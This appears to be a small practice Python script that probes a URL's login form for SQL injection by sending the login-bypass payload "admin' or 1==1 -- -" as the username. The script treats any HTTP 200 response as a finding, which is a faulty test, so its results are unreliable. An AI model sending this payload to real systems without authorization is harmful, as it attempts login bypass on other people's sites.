# detect sql injection using python

import requests
import sys


def check_sql_injection():
    if len(sys.argv) != 2:
        print("Usage: python3 practice.py <url>")
        sys.exit(1)
    global url
    url = sys.argv[1]
    print("URL: " + url)
    print("Checking for SQL injection...")
    # check for sql injection
    test = "admin' or 1==1 -- -"
    payload = {'uname':test, 'pass':'test'}
    r = requests.post(url, params=payload)
    code = r.status_code
    if code == 200:
        print("SQL injection found!")
    else:
        print("SQL injection not found.")
check_sql_injection()
